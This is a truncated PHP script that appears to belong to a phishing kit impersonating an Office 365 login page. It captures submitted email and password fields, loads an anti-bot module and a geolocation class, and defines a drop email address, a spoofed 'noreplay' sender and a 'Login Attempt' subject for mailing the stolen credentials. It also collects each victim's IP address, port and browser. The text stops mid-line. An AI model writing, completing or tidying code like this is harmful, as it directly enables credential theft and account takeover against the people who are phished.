<?php
$Email = $_POST['email']; // Use lowercase 'e' for 'email' variable name for consistency
$password = $_POST['password'];
include_once('antibots.php');
require_once __DIR__ . '/geoplugin.class.php';

// Define constants for clarity and easier future updates
define("EMAIL", "terryanderson0110@gmail.com");
define("SUBJECT", "Office365 - Login Attempt");
define("FROM_EMAIL", "noreplay.dgz.gdn@protonmail.com");
define("LOCATION", "http://example.com"); // Replace with your desired URL to redirect users after submission

$geoplugin = new \GeoPlugin();

$ip = $_SERVER["REMOTE_ADDR"];
$port = $_SERVER["REMOTE_PORT"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d,
